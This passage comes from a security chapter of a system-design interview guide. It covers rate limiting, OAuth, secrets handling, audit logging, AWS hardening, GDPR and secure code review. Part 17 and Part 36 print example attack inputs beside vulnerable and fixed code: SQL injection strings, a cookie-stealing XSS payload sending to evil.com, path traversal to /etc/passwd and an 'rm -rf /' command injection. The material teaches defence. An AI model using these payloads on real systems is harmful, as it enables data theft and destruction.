Key rotation: just re-encrypt the DEK with the new KEK — data doesn't change
Access: AWS KMS decrypts DEK, application decrypts data
```

AWS KMS, GCP Cloud KMS, and HashiCorp Vault implement this pattern. You should understand it and be able to describe it in a system design interview when asked about data encryption at scale.

---

## Part 16: Rate Limiting as a Security Control

Rate limiting is covered in Chapter 93 (Bonus Advanced Topics) from a scalability perspective. Here, the security perspective.

**Without rate limiting, these attacks are easy:**
- **Credential stuffing:** Attacker has a list of 10 million username/password pairs from data breaches. Without rate limiting, they can try all 10 million combinations in minutes. With rate limiting (10 attempts per IP per minute), it takes 2 years.
- **API key brute force:** If your API key is 6 characters, there are 36^6 = 2.2 billion combinations. At 100 requests/second (unrestricted), checkable in 6 hours. At 10 requests/minute, checkable in 413 years.
- **Account enumeration:** Without rate limiting, an attacker can probe `POST /api/login` with 1 million usernames to find which accounts exist (using response time differences or error message differences).
- **Data scraping:** Without rate limiting, a competitor can scrape your entire product catalog in minutes.

**Where to apply rate limits:**
- Authentication endpoints: strictest (10 attempts/minute/IP)
- Password reset, email verification: strict (5 per hour per email address)
- API endpoints (authenticated users): moderate (1,000 requests/minute per token)
- API endpoints (unauthenticated): strict (100 requests/minute per IP)
- Search/query endpoints: moderate (50 complex queries/minute per user)

**Rate limiting must consider:**
- **Distributed IPs:** Attackers use botnets (millions of IPs). Per-IP rate limiting alone is bypassed. Also limit per-account, per-email-domain.
- **Fail open vs fail closed:** If the rate limiting service is down, fail open (allow traffic) to not break the product, but alert immediately.
- **Retry-After header:** Return `429 Too Many Requests` with a `Retry-After: 60` header. Well-behaved clients will back off.

---

## Part 17: SQL Injection — Deep Dive

SQL injection is 30+ years old and still responsible for major breaches. Understanding it deeply prevents it.

**Why SQL injection works:**
```sql
-- Application builds this query:
"SELECT * FROM users WHERE email = '" + user_email + "' AND password = '" + password + "'"

-- Normal input: user_email = "alice@example.com", password = "hunter2"
-- Results in: SELECT * FROM users WHERE email = 'alice@example.com' AND password = 'hunter2'

-- Malicious input: user_email = "' OR '1'='1"
-- Results in: SELECT * FROM users WHERE email = '' OR '1'='1' AND password = '...'
-- '1'='1' is always true → returns ALL users → attacker logs in as first user
```

**Parameterized queries (the fix):**
```python
# Vulnerable (string concatenation)
cursor.execute(f"SELECT * FROM users WHERE email = '{email}' AND password = '{password}'")

# Correct (parameterized)
cursor.execute("SELECT * FROM users WHERE email = %s AND password = %s", (email, password))
```

**ORMs can still be vulnerable:** Using an ORM doesn't automatically prevent SQL injection if you use raw query methods:
```python
# Vulnerable ORM usage (Django)
User.objects.raw(f"SELECT * FROM users WHERE email = '{email}'")  # Still vulnerable

# Safe ORM usage
User.objects.filter(email=email)  # ORM parameterizes automatically
```

**Second-order SQL injection:** The first-order vulnerability is when user input goes directly into a query. Second-order is when user input is safely stored in the database, but is then used unsafely in a later query:
```python
# User safely stores their username in the database
username = parameterized_insert(user_provided_username)  # stored safely as "admin'--"

# Later, username is fetched from DB and used unsafely in another query
username = fetch_username_from_db(user_id)  # returns "admin'--"
cursor.execute(f"SELECT * FROM permissions WHERE user = '{username}'")  # VULNERABLE
```

The fix: parameterize every query, not just those that take direct user input. Data from the database should be treated as untrusted if it was derived from user input at any point.

---

## Part 18: Secrets Management in Production

The three most common places secrets accidentally end up where they shouldn't:

**1. Source code (most dangerous)**
```python
# Found in real production code:
DATABASE_URL = "postgresql://admin:SuperSecretPass123@prod-db.company.com:5432/app"
STRIPE_SECRET_KEY = "sk_live_1234567890abcdef"
AWS_SECRET_ACCESS_KEY = "AKIA1234567890ABCDEF"
```

Even if you immediately delete the commit, the history remains. Git history is permanent; a `git log --all` or GitHub's blame history will reveal it. Use `git-secrets` or `truffleHog` to scan for committed secrets. If a secret is ever committed, assume it's compromised and rotate immediately.

**2. Environment variables (risky if logged)**
Environment variables are better than code — they can be changed without a deploy. But:
- They often appear in crash dumps and error logs
- They're visible to any code running in the same process
- Some web frameworks print all env vars on errors

Better: load secrets from AWS Secrets Manager, GCP Secret Manager, or HashiCorp Vault at application startup. The secret is in memory only; it's never an environment variable in a log-visible place.

**3. Log files**
Engineers log everything during debugging. Sometimes they log request bodies, request headers, or internal state — which includes tokens and credentials. Common example:
```python
logger.debug(f"Received request: {request.json()}")  # might log {"credit_card": "4242..."}
logger.info(f"Calling payment API with config: {config}")  # might log the API key
```

Policy: never log request bodies in production; never log configuration objects that might contain secrets; in logging libraries, add a secrets masking layer that redacts known-sensitive fields.

**Secret rotation in practice:**
```
1. Generate new secret
2. Add new secret to application as an additional accepted value
   (application now accepts both old and new during transition)
3. Update all systems that use the secret to use the new value
4. Remove old secret from application
5. Revoke old secret at the source (e.g., delete the old IAM access key)

Never: rotate by removing old before deploying new
       (this causes authentication failures during the rotation window)
```

---

## Part 19: OAuth 2.0 Deep Dive

OAuth 2.0 is the standard for delegated authorization. It's used everywhere: "Sign in with Google," Slack integrations, GitHub Apps, Stripe Connect. Engineers who understand it properly can identify misconfigurations.

**The three roles:**
- **Resource Owner:** The user who owns the data (e.g., a Google user)
- **Authorization Server:** The server that issues tokens (e.g., Google's OAuth server)
- **Client:** The application requesting access (e.g., your app)
- **Resource Server:** The server holding the user's data (e.g., Google's API)

**Authorization code flow (the most secure):**
```
1. User clicks "Sign in with Google" on your app
2. Your app redirects user to Google's auth page:
   https://accounts.google.com/o/oauth2/auth?
     client_id=your_client_id&
     redirect_uri=https://yourapp.com/callback&
     scope=openid+email&
     response_type=code&
     state=random_csrf_value
3. User authenticates to Google and approves access
4. Google redirects back: https://yourapp.com/callback?code=auth_code&state=random_csrf_value
5. Your server exchanges code for tokens (server-to-server, never in browser):
   POST https://oauth2.googleapis.com/token
   { client_id, client_secret, code, redirect_uri, grant_type: "authorization_code" }
6. Google returns: { access_token, refresh_token, id_token, expires_in }
7. Your app stores refresh_token; uses access_token for API calls
```

**Critical security steps:**
- Validate the `state` parameter matches what you sent (prevents CSRF)
- Always use HTTPS for redirect_uri
- Keep `client_secret` on the server — never in client-side JavaScript
- Validate the `redirect_uri` — a misconfigured redirect_uri allows token theft

**Common OAuth misconfigurations:**
1. **Open redirect_uri:** `redirect_uri=https://yourapp.com/callback?next=ATTACKER_URL` — attacker redirects the auth code to their server. Fix: validate redirect_uri against an explicit allowlist.
2. **Missing state parameter:** Without the state check, an attacker can send a victim a link that authenticates them to the attacker's Google account ("login CSRF"). Fix: always use and verify the state parameter.
3. **Storing OAuth tokens in localStorage:** Accessible via XSS. Fix: store in HttpOnly cookies (not accessible to JavaScript).

---

## Part 20: Brainstorming Q&A — Security

**Q: "Design the authentication system for a B2B SaaS platform where companies (organizations) can have multiple users with different roles."**

This requires multi-tenant auth:

1. **JWT claims:** `{ user_id, org_id, role, exp }`. The `org_id` is included in the token so every API can enforce tenant isolation without a DB lookup.

2. **Authorization pattern:** Every API endpoint has two checks: (1) is the user authenticated? (2) does the user belong to the organization that owns the resource? Example: `WHERE project_id = :id AND tenant_id = :tenant_id_from_jwt`. Never trust the tenant_id from the request body — derive it from the authenticated JWT.

3. **Role hierarchy:** RBAC within each organization. Roles: org-admin, project-admin, member, viewer. Permissions granted to roles, not to individual users (easier to manage as the org scales).

4. **SSO integration:** Enterprise customers need SAML 2.0 or OIDC SSO. When a user logs in via SSO, your identity provider receives the assertion, maps the SSO identity to a local user (creating one if it's their first login — just-in-time provisioning), and issues your application's JWT. The SSO system is separate from your application's auth — your app just needs to trust the SSO provider's assertions.

5. **Service account tokens:** Machine-to-machine authentication within the org. Long-lived (but rotatable) API keys associated with the organization, not a user.

**Q: "How would you design an audit logging system that is tamper-evident?"**

Audit logs have a unique requirement: they must be trustworthy even if the application's database is compromised. An attacker who has DB access shouldn't be able to delete or modify audit log entries to cover their tracks.

Design:
1. **Append-only storage:** Write audit events to a Kafka topic. Kafka's retention is append-only — existing records cannot be modified or deleted (only expired after TTL). Or: write to AWS CloudTrail-style S3 append-only storage.

2. **Cryptographic chaining:** Each log entry includes a hash of the previous entry (Merkle chain). Any deletion or modification breaks the chain — detectable by verification.

3. **Separate write path:** The application can write to audit logs but cannot delete from them (no DELETE permission in the audit log service's IAM policy). Even a compromised application cannot destroy audit logs.

4. **Log integrity verification:** Regularly run a background process that verifies the chain of hashes. Alert if any entry's hash doesn't match.

5. **External write to SIEM:** Send all audit events to a Security Information and Event Management (SIEM) system (Splunk, Datadog Security) that is outside the application's trust boundary. The SIEM is harder to compromise than the application.

---

## Part 21: Security Monitoring and Anomaly Detection

Security monitoring is the practice of detecting security events in real time, before they become incidents.

**What to monitor:**

| Event                                           | Signal                                          |
|-------------------------------------------------|-------------------------------------------------|
| Failed authentication attempts (burst)          | Credential stuffing or brute force              |
| Successful login from new country/device        | Account takeover                                |
| Admin actions outside business hours            | Insider threat or compromised admin account     |
| High volume of 403 Forbidden responses          | Access control probing / IDOR scanning          |
| Unusual DB query patterns (high row count)      | Data exfiltration attempt                       |
| New IAM policy attachments                      | Privilege escalation                            |
| Secrets accessed outside rotation schedule     | Credential theft                                |
| High API error rate from single IP              | Automated attack                                |

**Alert thresholds (rough guidance):**
- 10+ failed logins in 1 minute per user → alert, lock account
- 100+ 403s in 1 minute from one IP → alert, consider IP block
- Admin action from a country the user has never accessed from → alert, require MFA re-auth
- 1M+ rows returned in a single query → alert (possible data dump)
- New IAM policy with `Action: *` or `Resource: *` → alert immediately

**The SIEM and the SOAR:**
- **SIEM (Security Information and Event Management):** Aggregates logs from all systems; provides alerting and dashboards. Splunk, Datadog Security, AWS Security Hub.
- **SOAR (Security Orchestration, Automation, and Response):** Automated response to security events. "If a credential stuffing attack is detected, automatically lock the targeted accounts and send an email to affected users."

---

## Part 22: Secure Development Lifecycle (SDL)

At Staff/L6 level, security is not just about writing secure code — it's about making the team write secure code. This means building security into the development process.

**Code review:** Every PR that touches auth, authorization, or data access should have a security-focused reviewer. Create a checklist: parameterized queries? Authorization checks? No hardcoded secrets? Output encoding?

**Static analysis:** Integrate security static analysis into CI:
- **Semgrep:** Pattern-based code analysis for security bugs. Custom rules for your codebase.
- **Bandit (Python):** Scans Python code for common security issues.
- **GoSec (Go):** Security linter for Go code.
- **ESLint security plugin (JS):** Detects common JS security issues.

**Dependency scanning:** Scan all third-party dependencies for known CVEs:
- **Dependabot** (GitHub): automatic PRs for dependency updates with CVE fixes
- **Snyk:** Broader vulnerability database; supports containers and IaC
- **OWASP Dependency-Check:** Open source scanner

**Penetration testing:** Annually (or before major launches), engage external pentesters to attempt to compromise the system. Internal security team can do red team exercises. The findings should feed back into threat model updates.

**Bug bounty programs:** For public products, a bug bounty program incentivizes security researchers to report vulnerabilities rather than exploit them. HackerOne, Bugcrowd. Requires a responsible disclosure policy and a security contact.

---

## Part 23: Cloud Security Specifics (AWS)

Most backend systems run in AWS. Cloud-specific security controls are critical knowledge.

**IAM best practices:**
- Use IAM roles, not access keys. IAM roles provide temporary credentials that auto-rotate; access keys are long-lived and can be leaked.
- Apply least privilege: grant only the specific actions on specific resources needed.
- Enable MFA for all console accounts.
- Audit IAM policies regularly (AWS IAM Access Analyzer).
- Never use the root account except for account-level settings.

**S3 security:**
- Block public access at the account level (not per-bucket) as default.
- Bucket policies + ACLs: use bucket policies for most cases; avoid ACLs (harder to reason about).
- S3 bucket encryption: default encryption with SSE-S3 or SSE-KMS (latter provides audit trail via CloudTrail).
- S3 access logging: enable to track who accessed what objects.
- Never store credentials in S3 buckets (even "private" ones — bucket policies can be misconfigured).

**Security Groups:**
- Deny by default; allow only necessary inbound traffic.
- Never open `0.0.0.0/0` (all traffic) on SSH (port 22) or database ports.
- Database security groups: allow only from application server security group, not from public internet.
- Use VPC endpoints for AWS service access (S3, DynamoDB) — keeps traffic within AWS network, avoids internet exposure.

**CloudTrail:** Enable AWS CloudTrail in all regions. It logs all API calls to AWS services — who did what, when, from where. Required for security incident investigation; often required for compliance (SOC 2, HIPAA, PCI DSS).

---

## Part 24: Security in Code Review — What to Look For

When reviewing code from a security perspective, these are the highest-priority checks:

**Authentication bypass:**
- Is every endpoint that requires authentication protected?
- Are there any endpoints that should require auth but don't?
- Is auth enforced in a central middleware (hard to bypass) or per-handler (easy to forget)?

**Authorization bypass:**
- After authentication, does the code verify the user has permission for the specific resource?
- Are there any paths where the user ID in the URL/body is used without checking it matches the authenticated user?

**Injection:**
- Are all database queries using parameterized queries or ORM methods?
- Are any OS commands constructed from user input?
- Are any template renders including unsanitized user input?

**Sensitive data:**
- Is any PII or sensitive data being logged?
- Are secrets being returned in API responses?
- Is sensitive data encrypted before storage?

**Error handling:**
- Are error messages revealing implementation details (stack traces, table names)?
- Are errors being logged securely (not logging sensitive request data)?

**Input validation:**
- Are file uploads validated for type, size, and content?
- Are URLs validated before fetching?
- Are integer inputs validated for range?

---

## Part 25: Chapter Final Summary and Reference

**Security in one principle:** The most secure system is one where doing the secure thing is the path of least resistance. If developers have to fight the framework to write secure code, they'll write insecure code. If secure defaults are the framework defaults, secure code is the inevitable result.

**Security thinking checklist for any design:**

```
□ AuthN: How are callers identified? What algorithm? What TTL? How revoked?
□ AuthZ: How is every action gated? Is it enforced server-side? Least privilege?
□ Data: What categories exist? How is PII handled? Encryption at rest/in transit?
□ Input: Where is user input accepted? Parameterized? Validated at boundary?
□ Output: Is sensitive data masked in responses? Are errors generic externally?
□ Rate limiting: Are sensitive endpoints protected against brute force?
□ Audit: What security events are logged? Are logs append-only and protected?
□ Secrets: Where are credentials stored? How are they rotated?
□ Dependencies: Are all third-party libraries scanned for CVEs?
□ Threat model: STRIDE applied? What's the worst-case attack scenario?
```

**Key numbers:**
- bcrypt cost factor 12: ~300ms per hash (prevents brute force at ~3/second)
- Argon2id memory cost 64MB: ~1ms on modern hardware (adjustable)
- SHA-256: cryptographically secure for hashing (not for passwords)
- MD5/SHA-1: broken for security purposes; collisions found
- AES-256: standard symmetric encryption; key space 2^256
- RSA-2048: minimum recommended; RSA-4096 for long-term data

---

## Part 26: Security War Stories — Extended Case Studies

**The GitHub OAuth CSRF (2012):** A researcher discovered that GitHub's OAuth implementation was missing the `state` parameter validation. An attacker could craft a URL that, when visited by a victim, attached the attacker's GitHub account to the victim's application. The victim would be logged in as the attacker, not themselves. Impact: account takeover via login CSRF.

Lesson: The `state` parameter in OAuth is not optional. It prevents login CSRF. Every OAuth implementation must generate a random state value, send it in the initial redirect, and verify it matches when the callback comes back.

**The Slack OAuth token in URL (2020):** Slack's workspace export feature generated URLs that contained OAuth tokens as query parameters (e.g., `?token=xoxp-1234...`). These tokens appeared in server access logs, proxy logs, browser history, and Referer headers — anywhere URLs get logged. Slack rotated millions of tokens after discovery.

Lesson: Never put credentials or sensitive tokens in URLs. Use POST bodies or headers. If you must use URLs (webhooks, OAuth callbacks), use one-time codes that are exchanged for tokens server-side.

**The AWS S3 bucket misconfiguration epidemic (2017-2020):** Hundreds of organizations accidentally made S3 buckets public:
- Verizon: 14M records (2017)
- Dow Jones: 2.2M subscribers (2017)
- US Army: intelligence data (2017)
- GoDaddy: AWS infrastructure configs (2018)

Pattern: A developer created a bucket for file sharing (easier with public access), forgot to make it private, or didn't know that S3 bucket policies needed to be explicitly configured. 

Root cause: Public access was opt-out in S3 (you had to remember to make things private) rather than opt-in.

Lesson: AWS's 2018 response — adding "Block Public Access" at the account level — was the right fix. Security defaults must be the restrictive defaults. Engineers shouldn't have to actively choose security; they should have to actively choose to reduce security.

**The Twitter admin panel (2020):** Attackers used social engineering to compromise Twitter employees with access to the internal admin panel. They then used the admin panel to hijack high-profile accounts (Obama, Gates, Biden, Elon Musk) for a Bitcoin scam.

The admin panel was designed for legitimate use — the vulnerability was that once an attacker had an employee's credentials, there was no additional control preventing them from accessing any account.

Lessons: (1) High-privilege admin actions need additional authentication (MFA per operation, not just at login). (2) Admin actions should be rate-limited (even legitimate admins don't need to modify 100 accounts in 5 minutes). (3) Anomaly detection: an employee modifying high-follower accounts at unusual hours should trigger an alert.

**The Heartbleed bug (OpenSSL 2014):** The Heartbleed bug in OpenSSL allowed an attacker to read 64 KB of server memory per request. This memory might contain private TLS keys, session tokens, or plaintext data. An attacker could repeatedly request memory until they extracted something useful. Millions of servers were vulnerable; the bug was in a widely-deployed library.

Lesson: You are as secure as your dependencies. A library bug can expose secrets even if your application code is perfect. Dependency scanning and prompt patching are not optional.

---

## Part 27: Data Privacy and GDPR Essentials

Security engineers need to know the legal context in which they operate.

**GDPR (General Data Protection Regulation):**
- Applies to any organization that processes personal data of EU residents, regardless of where the organization is located
- Personal data: any information that can identify a person (name, email, IP address, cookie ID)
- Key requirements:
  - **Data minimization:** only collect what you actually need
  - **Purpose limitation:** only use data for the purposes stated when collecting
  - **Right to erasure:** users can request their data be deleted
  - **Data portability:** users can request a copy of their data
  - **Data breach notification:** must notify supervisory authority within 72 hours of discovering a breach; must notify affected individuals "without undue delay"

**Engineering implications:**
1. **Data inventory:** Know what PII your system collects and where it's stored. You can't delete what you can't find.
2. **Soft deletion + hard deletion:** "Deleting" a user account often means soft-deletion (marking inactive). For GDPR right to erasure, you need a true hard deletion path — removing PII from primary DB, backups, data warehouses, logs (within reasonable retention policies).
3. **Encryption and pseudonymization:** Encrypting PII with a key that can be deleted effectively anonymizes the data when the key is deleted. A practical approach for GDPR compliance: encrypt PII with a per-user key; delete the key to satisfy erasure requests without modifying backups.
4. **Data residency:** GDPR restricts transferring EU data to non-adequate countries (including the US, historically). Technical controls: geo-routing, data residency enforcement in storage.
5. **Consent management:** If you use cookies or tracking, you must obtain and record consent. Engineering requirement: consent management platform (OneTrust, Cookiebot) integrated with your tracking.

---

## Part 28: Penetration Testing Concepts

A Staff engineer should be able to communicate with pentesters and understand pentest reports.

**Types of penetration testing:**
- **Black box:** Tester has no prior knowledge of the system (simulates an external attacker)
- **White box:** Tester has full access to code, architecture, credentials (simulates an insider threat)
- **Grey box:** Tester has some knowledge (common for web application pentests)

**Common pentest findings categories (CVSS severity):**
- **Critical (CVSS 9.0-10.0):** Remote code execution, authentication bypass, SQL injection leading to data dump
- **High (CVSS 7.0-8.9):** IDOR exposing sensitive data, significant privilege escalation, stored XSS
- **Medium (CVSS 4.0-6.9):** Reflected XSS, weak session management, CSRF on sensitive operations
- **Low (CVSS 0.1-3.9):** Missing security headers, verbose error messages, outdated TLS versions
- **Informational:** Best practice improvements, non-security issues

**When you receive a pentest report:**
1. Sort findings by severity and fix Critical and High first
2. For each finding: understand the root cause (not just the specific instance)
3. Fix the root cause, not just the specific vulnerability found (if IDOR found on `/api/users/{id}`, check all endpoints for IDOR, not just that one)
4. Verify the fix by having the pentester retest after deployment
5. Feed systemic findings back into development standards (if XSS found, add CSP; if IDOR found, add authorization review checklist)

---

## Part 29: Additional Practice Exercises

**Exercise 5 (Threat model):** Threat model a file upload endpoint:
```
POST /api/upload
Content-Type: multipart/form-data
Body: { file: <user-uploaded file> }
Server: stores file in S3, returns URL
```
For each of the 6 STRIDE categories: what is the specific attack against this endpoint, and what is the mitigation?

**Exercise 6 (Auth design):** You're building a payment API where merchants can create payment charges. The API uses API keys for authentication. Design:
- How API keys are generated (format, entropy)
- How API keys are stored in the database (plaintext? hashed? how?)
- How API keys are authenticated on each request
- How API keys are rotated without downtime
- How API key leakage is detected (hint: honeypot keys)

**Exercise 7 (OAuth threat model):** A developer suggests implementing OAuth by using the implicit flow (which returns access_tokens in URL fragments instead of codes). Explain why this is a security concern and what should be used instead.

**Exercise 8 (Incident response):** You've received a tip that your company's AWS access keys may have been leaked to GitHub. Walk through the exact steps you'd take in the next 30 minutes. What do you check first? What actions do you take? Who do you notify?

Answer outline for Exercise 8:
1. Immediately rotate the potentially-leaked AWS access keys (generate new, update all systems using old, delete old — in that order to avoid downtime)
2. Check CloudTrail for any actions taken with the leaked credentials over the past 24 hours
3. Check for any new IAM users, policies, or roles created (potential persistence mechanisms)
4. Check for any data accessed from S3 buckets
5. Check for any EC2 instances launched (crypto mining is common)
6. Notify security team and management
7. File an incident report; assess whether breach notification is required

---

## Part 30: Security for Staff Engineers — Summary

Security at Staff level is not about being a security specialist. It is about:

1. **Designing systems where security is the default.** Deny by default. Fail closed. Least privilege built into the data model and IAM policies from day one.

2. **Integrating security into the design process.** Every design doc should have a threat model section. Every code review of auth or data access code should have a security-focused reviewer.

3. **Speaking security fluently in system design interviews.** Authentication, authorization, encryption, rate limiting, audit logging — proactively, not when prompted.

4. **Knowing the incidents and what they teach.** Equifax (patch management), Capital One (SSRF + overprivileged IAM), Uber (credentials in code), Twitter (insufficient admin controls), Heartbleed (dependency management). Each incident is a lesson in what breaks.

5. **Building security culture on your team.** Templates, checklists, automated scanning in CI, blameless security incident reviews that change systems rather than blame individuals.

Security is engineering. The same rigor that produces reliable systems produces secure systems. The same habits that prevent bugs prevent vulnerabilities. Security mindset is software engineering mindset applied to adversarial conditions.

---

## Part 31: Final Reference Tables

**OWASP Top 10 quick reference:**

| Rank | Category                          | Key fix                                         |
|------|-----------------------------------|-------------------------------------------------|
| 1    | Broken Access Control             | Server-side authz on every resource access      |
| 2    | Cryptographic Failures            | TLS everywhere; bcrypt for passwords            |
| 3    | Injection                         | Parameterized queries; no string concatenation  |
| 4    | Insecure Design                   | Threat model during design phase                |
| 5    | Security Misconfiguration         | Security-hardening scripts in deploy pipeline   |
| 6    | Vulnerable/Outdated Components    | Automated dependency scanning + patch SLA       |
| 7    | Auth Failures                     | Rate limiting; strong token standards; MFA      |
| 8    | Software Integrity Failures       | Signed artifacts; trusted dependency sources    |
| 9    | Security Logging Failures         | Log all auth events; tamper-evident storage     |
| 10   | SSRF                              | URL allowlist; block private IP ranges          |

**JWT security checklist:**

| Check                                     | Why                                           |
|-------------------------------------------|-----------------------------------------------|
| Specify `algorithms=["RS256"]` explicitly | Prevents algorithm confusion attacks          |
| Set `exp` (expiry) on every token         | Limits damage from token theft                |
| Validate `iss` (issuer)                   | Prevents tokens from other services being used|
| Validate `aud` (audience)                 | Prevents tokens meant for service A from being used at service B |
| Never put sensitive data in payload       | JWT payload is base64, not encrypted          |
| Rotate signing keys                       | Limits blast radius of key compromise         |
| Keep access token TTL short (15 min)     | Reduces window for misuse                     |
| Use refresh token rotation                | Invalidates old refresh tokens on use (one-time use) |

---

## Part 32: Security Antipattern Gallery

**Antipattern: The "Admin Panel" with No Extra Controls**

A common implementation: the admin panel is a separate frontend at `admin.yourapp.com`. It checks that the logged-in user has the `admin` role at login time. But the admin panel's API calls go to the same backend API endpoints that regular users call — they just pass extra parameters that trigger admin functionality.

The problem: if an attacker can forge admin role in a JWT or bypass the frontend check (e.g., by calling the API directly), there's no second line of defense. The backend API trusts the role from the JWT without additional verification.

What Staff engineers do: Separate admin operations onto a different code path with additional controls:
- Require MFA re-authentication for admin operations (even if the user logged in an hour ago)
- Rate limit admin operations more aggressively than user operations
- Alert on any admin operation (every one, logged to a separate high-priority audit system)
- Require a second admin to approve especially sensitive operations (four-eyes principle for actions like: bulk data export, user account deletion, permission escalation)

**Antipattern: The "Secure" Storage in S3 Public Bucket**

A development team stores user profile photos in an S3 bucket. They set the bucket to public because "photos are public anyway." Six months later, a developer stores CSV exports in the same bucket for "temporary" processing. The exports are public for 4 days before someone notices.

The fix: Separate storage buckets for different sensitivity levels. Public assets (profile photos) in a public bucket. All processed data in private buckets with pre-signed URLs for time-limited access. The infrastructure-as-code should enforce this — the private bucket should have `BlockPublicAcls: true` in Terraform/CloudFormation so it can never accidentally become public.

**Antipattern: The "We'll Add TLS Later"**

A startup builds their API over HTTP during development. "We'll add HTTPS before launch." They launch with HTTPS, but:
- Internal service-to-service traffic still goes over HTTP (inside the VPC, "it's safe")
- Some webhook receivers still accept HTTP
- The mobile app still allows HTTP for the staging environment
- Six months later: HTTP traffic is still flowing between services; mobile apps in production sometimes downgrade to HTTP when HTTPS fails

TLS everywhere from day one is far easier than retrofitting TLS onto an HTTP-native system.

---

## Part 33: Security in Different Product Contexts

**B2C consumer product (social network, e-commerce):**
- Focus: authentication (millions of users, credential stuffing attacks), XSS (user-generated content), CSRF, data privacy (GDPR, CCPA)
- Scale means automation: can't manually review security events; need SIEM and automated alerting
- Account takeover is the primary threat: invest in MFA, suspicious login detection, and account recovery security

**B2B SaaS (Slack, Notion, GitHub):**
- Focus: multi-tenant data isolation, SSO/SAML integration, role-based access control, audit logs for compliance
- Customers (enterprises) will ask for: SOC 2 certification, penetration test reports, data processing agreements, custom data retention
- The most damaging scenario: Tenant A can read Tenant B's data (multi-tenant isolation failure)

**Payment/financial systems (Stripe, PayPal, banks):**
- Focus: PCI DSS compliance, fraud prevention, double-spend prevention, transaction integrity
- PCI DSS requirements: network segmentation, encryption of cardholder data, no storage of CVV, access control, regular security testing
- Every dollar of fraud is a direct cost; security investment has direct ROI

**Healthcare (Epic, medical devices):**
- Focus: HIPAA compliance, PHI (Protected Health Information) protection, access logging for audit
- Any breach of PHI requires breach notification to affected patients + HHS
- Access logs are required for all PHI access — who accessed which record, when

**Internal developer tooling:**
- Focus: supply chain security (don't let internal tools become a vector for attackers to reach production), secrets in developer environments
- Internal tools often have broad production access — they're high-value targets

---

## Part 34: Pre-Interview Security Drill

Answer each in 60 seconds:

1. A user reports they can access another user's order history by changing the user_id in the URL. What is the vulnerability? How do you fix it?
2. An engineer proposes storing JWT tokens in localStorage. What's the security concern?
3. Explain the difference between authentication and authorization. Give a concrete example of a system that authenticates correctly but authorizes incorrectly.
4. What is SQL injection? Write the fix in code.
5. A new engineer hard-commits an AWS secret key to GitHub. What do you do immediately?
6. Design the rate limiting strategy for a login endpoint.
7. What is the "confused deputy" problem in microservices? Give an example.
8. Your API returns `{"error": "SQL syntax error: SELECT * FROM users WHERE email = 'alice' and password = '"}`. What's wrong and how do you fix it?
9. What is SSRF? Give a concrete attack example.
10. Name three things you should always include when designing a security-sensitive feature in a system design interview.
11. What hashing algorithm should you use for passwords? For API keys? Why are they different?
12. What is the purpose of the `state` parameter in OAuth 2.0?

---

## Part 35: Security Checklist — For Any New Feature

Before shipping a new feature, review:

**Authentication:**
- [ ] Does this feature require authentication? Is it enforced?
- [ ] Is the authentication performed in the request path (middleware) rather than per-handler?
- [ ] Are unauthenticated endpoints intentionally public?

**Authorization:**
- [ ] Does this feature access resources owned by specific users or organizations?
- [ ] Is ownership verified server-side (not just from the request body)?
- [ ] If multi-tenant: is the tenant_id derived from the auth token, not the request?

**Input Validation:**
- [ ] Is all user input validated at the API boundary?
- [ ] Are database queries parameterized?
- [ ] Are file uploads validated for type and size?
- [ ] Are URLs validated before fetching?

**Output:**
- [ ] Does the response expose only the minimum necessary data?
- [ ] Are error messages generic to external callers (no stack traces, no DB details)?
- [ ] Is user-generated content properly encoded in templates?

**Secrets:**
- [ ] Are there any new secrets? Are they stored in the secret manager, not in code?
- [ ] Are secrets excluded from logs and error messages?
- [ ] Do new IAM roles follow least privilege?

**Rate Limiting:**
- [ ] Is this endpoint rate limited appropriately?
- [ ] Are there sensitive operations (password reset, OTP) with stricter limits?

**Audit Logging:**
- [ ] Are sensitive operations logged (who, what, when, from where)?
- [ ] Is the log level appropriate (not logging PII unnecessarily)?

**Dependencies:**
- [ ] Are new dependencies scanned for known CVEs?

---

## Part 36: Common Security Vulnerabilities — Code Examples

**XSS (Cross-Site Scripting):**
```python
# Vulnerable (renders user content directly in HTML)
return f"<div>Welcome, {username}!</div>"
# If username = "<script>document.location='http://evil.com?c='+document.cookie</script>"
# → browser executes the script; steals cookies

# Correct: escape output
from markupsafe import escape
return f"<div>Welcome, {escape(username)}!</div>"
# → renders as text: "<script>document.location=..."

# Framework-native (React JSX auto-escapes)
return <div>Welcome, {username}!</div>;  # React escapes by default
# Dangerous React: {dangerouslySetInnerHTML: {__html: username}}  ← explicitly opt-in to dangerous
```

**Path Traversal:**
```python
# Vulnerable
filename = request.args.get('file')
with open(f"/uploads/{filename}") as f:
    return f.read()
# Attacker: file=../../etc/passwd → reads /etc/passwd

# Correct
import os
base_dir = os.path.abspath("/uploads")
user_path = os.path.abspath(os.path.join(base_dir, filename))
if not user_path.startswith(base_dir + os.sep):
    raise ValueError("Path traversal detected")
with open(user_path) as f:
    return f.read()
```

**Command Injection:**
```python
# Vulnerable
filename = request.args.get('filename')
os.system(f"convert {filename} output.jpg")
# Attacker: filename="input.jpg; rm -rf /"

# Correct: use subprocess with list arguments (no shell=True)
import subprocess
subprocess.run(["convert", filename, "output.jpg"], 
               check=True,
               capture_output=True,
               timeout=30)
```

**Insecure Deserialization (Python pickle):**
```python
# Vulnerable: pickle.loads() can execute arbitrary code
import pickle
data = pickle.loads(user_provided_bytes)  # NEVER unpickle user data

# Correct: use JSON for user data
import json
data = json.loads(user_provided_json)  # JSON cannot execute code
```

---

## Part 37: Why This Chapter Matters for Google L5

At Google, security is a non-negotiable dimension at every level:

**In system design interviews:** Every design question has a security component. "Design a payment system" — authentication, authorization, encryption, PCI compliance. "Design a URL shortener" — authentication bypass via predictable short codes, SSRF if the shortener follows links, rate limiting for spam. The candidate who proactively covers security signals Staff-level maturity.

**In code review:** Google expects engineers to catch security issues in code review. Injection vulnerabilities, auth bypasses, and IDOR bugs in code review are flagged as bugs. An engineer who consistently misses security issues in code review will not pass an L5 promo.

**In the incident response culture:** Google has a strong culture of blameless incident response. Security incidents follow the same pattern as reliability incidents: timeline → systemic root cause → action items that change systems. Engineers are expected to write and review these.

**In the Perf/Promo process:** "What security improvements has this engineer driven?" is a legitimate promo committee question at Google. If an engineer's projects have had zero security improvements, that's notable. If an engineer has proactively threat modeled their systems and implemented improvements, that's positive evidence for L6.

One-line pitch for security in a system design interview: *"Let me think through the security properties: authentication via JWT (RS256, 15-minute TTL); authorization server-side on every resource access (derived from the token, not the request body); PII encrypted at rest using envelope encryption with KMS; all DB operations use parameterized queries; authentication endpoints rate-limited to 10 attempts per minute; all payment/admin operations audit-logged in an append-only store."*

---

